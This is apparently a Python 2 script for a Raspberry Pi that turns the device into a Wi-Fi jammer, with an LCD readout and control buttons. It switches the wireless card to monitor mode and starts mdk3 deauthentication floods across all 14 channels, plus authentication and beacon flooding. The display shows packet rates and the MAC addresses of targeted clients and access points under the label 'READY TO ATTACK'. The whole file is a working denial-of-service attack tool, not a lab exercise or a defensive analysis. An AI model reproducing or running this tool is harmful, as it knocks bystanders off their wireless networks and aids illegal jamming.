#! /usr/bin/env python2

import RPi.GPIO as gpio
import smbus
from time import sleep
from os import system
from subprocess import check_output
from os import system

mode_pin = 17
stop_pin = 22
ledr_pin = 23
ledg_pin = 24
ledb_pin = 25
address = 0x04
clear = 0
bus = smbus.SMBus(1)


def setup():
	try:
		check_output('airmon-ng | grep mon0', shell=True)
	except:
		system('airmon-ng start wlan0')
	system('timedatectl set-time "2013-9-26 18:17:16"')
	gpio.setmode(gpio.BCM)
	gpio.setup(ledr_pin, gpio.OUT)
	gpio.setup(ledg_pin, gpio.OUT)
	gpio.setup(ledb_pin, gpio.OUT)
	gpio.setup(stop_pin, gpio.IN)
	gpio.setup(mode_pin, gpio.IN)
	gpio.output(ledg_pin, True)
	gpio.output(ledb_pin, False)
	gpio.output(ledr_pin, False)
	tolcd('WAITING FOR SYS', 1)
	sleep(30)
	tolcd('     STOPPED', 1)
	tolcd(' READY TO ATTACK', 2, wipe=False)


def main():
	while gpio.input(stop_pin):
		sleep(0.1)
	while True:
		sleep(0.1)
		if not gpio.input(stop_pin):
			jam()
		else:
			stop()


def jam():
	gpio.output(ledg_pin, False)
	gpio.output(ledr_pin, False)
	gpio.output(ledb_pin, True)
	tolcd('  INITIALISING', 1)
	for i in range(14):
		system('mdk3 mon0 d -c %i > /tmp/dlog%i &' % (i+1, i+1))
	system('mdk3 mon0 a > /tmp/alog &')
	system('mdk3 mon0 b > /tmp/blog &')
	sleep(5)
	gpio.output(ledb_pin, False)
	while not gpio.input(stop_pin):
		speed = check_output('tail -n 1 /tmp/blog | cut -b 34-36', shell=True).strip()
		if speed == '':
			speed = '0'
		channel = check_output('tail /tmp/blog -n 2 | head -1 | cut -b 91-92', shell=True).strip()
		if channel == '':
			channel = '0'
		client = check_output('cat /tmp/alog | grep "to target AP" | tail -n 1 | cut -b 68-84', shell=True).strip().replace(':', '')
		if client == '' or not len(client) == 12:
			client = ''
		ap = check_output('cat /tmp/alog | grep "to target AP" | tail -n 1 | cut -b 100-116', shell=True).strip().replace(':', '')
		if ap == '' or not len(ap) == 12:
			ap = ''
		if gpio.input(mode_pin):
			tolcd(' AP  ' + client, 1)
			tolcd(' NIC ' + ap, 2, wipe=False)
		else:
			tolcd(' CHANNEL %s' % channel, 1)
			tolcd(' SPEED %s PKTS' % speed, 2, wipe=False)
		gpio.output(ledr_pin, True)
		sleep(1)
		gpio.output(ledr_pin, False)
		sleep(1)
	return


def stop():
	gpio.output(ledb_pin, True)
	gpio.output(ledg_pin, False)
	gpio.output(ledr_pin, False)
	tolcd('    STOPPING', 1)
	system('rm /tmp/*log*')
	system('killall mdk3')
	system('killall mdk3')
	system('killall mdk3')
	sleep(5)
	gpio.output(ledb_pin, False)
	gpio.output(ledg_pin, True)
	tolcd('     STOPPED', 1)
	tolcd(' READY TO ATTACK', 2, wipe=False)
	while gpio.input(stop_pin):
		sleep(0.5)
	return


def tolcd(message, line, wipe=True):
	if wipe:
		bus.write_byte(address, clear)
		sleep(0.01)
	bus.write_byte(address, line)
	sleep(0.01)
	for c in message:
		bus.write_byte(address, ord(c))
		sleep(0.01)


if __name__ == '__main__':
	setup()
	main()
	gpio.cleanup()
